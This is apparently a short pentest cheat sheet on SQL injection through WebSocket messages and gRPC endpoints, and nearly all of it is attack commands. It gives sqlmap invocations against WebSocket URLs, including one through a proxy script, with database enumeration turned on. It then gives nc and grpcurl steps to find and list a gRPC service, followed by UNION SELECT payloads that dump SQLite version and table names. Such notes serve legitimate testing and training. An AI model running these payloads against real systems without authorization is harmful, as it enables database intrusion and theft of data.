# WebSocket SQL Injection

SQLi through WebSocket messages — standard tools don't natively handle WebSockets, so proxy through SQLMap via a helper script.

## Identify

WebSocket endpoints commonly visible in browser DevTools (Network → WS tab). Messages are often JSON.

## Exploit with SQLMap

```bash
# 1. Intercept a WebSocket message that includes the injectable parameter in Burp
# 2. Use sqlmap-websocket-proxy or the built-in --ws-url in newer sqlmap versions

# Direct sqlmap WebSocket support (sqlmap >= 1.7.2):
sqlmap -u 'ws://<TARGET>:<PORT>' --data '{"id": "1*"}' --dbs --batch

# For older sqlmap, use a proxy script:
# proxy listens on HTTP, forwards to WebSocket
python3 ws2sql.py --ws-url ws://<TARGET>/<ENDPOINT> --port 8080 &
sqlmap -u http://127.0.0.1:8080/?id=1 --dbs --batch --level 5 --risk 3
```

## gRPC SQLite Injection

When port 50051 is open (common gRPC):
```bash
# Identify gRPC
nc -zv <TARGET> 50051  # if TCP connection succeeds, likely gRPC

# Enumerate with grpcurl (no TLS)
grpcurl -plaintext <TARGET>:50051 list
grpcurl -plaintext <TARGET>:50051 list <ServiceName>
grpcurl -plaintext -d '{}' <TARGET>:50051 <ServiceName>/<MethodName>

# Inject in string fields
grpcurl -plaintext -d '{"id": "1 UNION SELECT 1,2,sqlite_version()--"}' \
  <TARGET>:50051 <ServiceName>/getUser

# SQLite dump
grpcurl -plaintext -d '{"id": "1 UNION SELECT group_concat(name),2,3 FROM sqlite_master WHERE type='\''table'\''--"}' \
  <TARGET>:50051 <ServiceName>/getUser
```
